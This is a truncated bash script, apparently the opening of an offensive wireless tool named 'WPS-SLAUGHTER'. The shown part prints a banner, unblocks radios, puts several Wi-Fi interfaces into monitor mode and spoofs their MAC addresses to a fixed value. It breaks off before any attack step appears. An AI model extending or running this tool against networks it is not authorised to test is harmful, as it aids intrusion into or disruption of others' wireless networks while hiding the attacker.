#!/bin/bash
clear
declare BSSID;
declare ESSID;
declare CHANNEL;
declare WIFI_MONITOR1;
declare WIFI_MONITOR2;
declare WIFI_MONITOR3;
declare WIFI_MONITOR4;
declare WIFI_MONITOR5;

echo "
██╗    ██╗██████╗ ███████╗      ███████╗██╗      █████╗ ██╗   ██╗ ██████╗ ██╗  ██╗████████╗███████╗██████╗ 
██║    ██║██╔══██╗██╔════╝      ██╔════╝██║     ██╔══██╗██║   ██║██╔════╝ ██║  ██║╚══██╔══╝██╔════╝██╔══██╗
██║ █╗ ██║██████╔╝███████╗█████╗███████╗██║     ███████║██║   ██║██║  ███╗███████║   ██║   █████╗  ██████╔╝
██║███╗██║██╔═══╝ ╚════██║╚════╝╚════██║██║     ██╔══██║██║   ██║██║   ██║██╔══██║   ██║   ██╔══╝  ██╔══██╗
╚███╔███╔╝██║     ███████║      ███████║███████╗██║  ██║╚██████╔╝╚██████╔╝██║  ██║   ██║   ███████╗██║  ██║
╚══╝╚══╝ ╚═╝     ╚══════╝      ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

"

echo "WPS-SLAUGHTER BY: Apathetic Euphoria"
echo "+ Help and Support from"
echo "    Aanarchyy,Deltax"

sleep 3
clear

sudo rfkill unblock all

#####Functions for Monitor Mode####

enable_mon_mode_1()
{
echo "Enabling Monitor Mode on $WIFI_MONITOR1"
sudo ifconfig $WIFI_MONITOR1 down
sleep 1
sudo iwconfig $WIFI_MONITOR1 mode monitor
sleep 1
sudo ifconfig $WIFI_MONITOR1 up
echo "Monitor Mode Enabled"
}

enable_mon_mode_2()
{
echo "Enabling Monitor Mode on $WIFI_MONITOR2"
sudo ifconfig $WIFI_MONITOR2 down
sleep 1
sudo iwconfig $WIFI_MONITOR2 mode monitor
sleep 1
sudo ifconfig $WIFI_MONITOR2 up
echo "Monitor Mode Enabled"
}

enable_mon_mode_3()
{
echo "Enabling Monitor Mode on $WIFI_MONITOR3"
sudo ifconfig $WIFI_MONITOR3 down
sleep 1
sudo iwconfig $WIFI_MONITOR3 mode monitor
sleep 1
sudo ifconfig $WIFI_MONITOR3 up
echo "Monitor Mode Enabled"
}

enable_mon_mode_4()
{
echo "Enabling Monitor Mode on $WIFI_MONITOR4"
sudo ifconfig $WIFI_MONITOR4 down
sleep 1
sudo iwconfig $WIFI_MONITOR4 mode monitor
sleep 1
sudo ifconfig $WIFI_MONITOR4 up
echo "Monitor Mode Enabled"
}

enable_mon_mode_5()
{
echo "Enabling Monitor Mode on $WIFI_MONITOR5"
sudo ifconfig $WIFI_MONITOR5 down
sleep 1
sudo iwconfig $WIFI_MONITOR5 mode monitor
sleep 1
sudo ifconfig $WIFI_MONITOR5 up
echo "Monitor Mode Enabled"
}

####End of Functions for Monitor Mode####

#### Functions for MAC CHANGER ####

mac_change_1()
{
echo "Setting the MAC Address on $WIFI_MONITOR1"
sudo ifconfig $WIFI_MONITOR1 down
sleep 3
macchanger $WIFI_MONITOR1 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $WIFI_MONITOR1 up
echo "MAC Changed"
}

mac_change_2()
{
echo "Setting the MAC Address on $WIFI_MONITOR2"
sudo ifconfig $WIFI_MONITOR2 down
sleep 3
macchanger $WIFI_MONITOR2 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $WIFI_MONITOR2 up
echo "MAC Changed"
}

mac_change_3()
{
echo "Setting the MAC Address on $WIFI_MONITOR
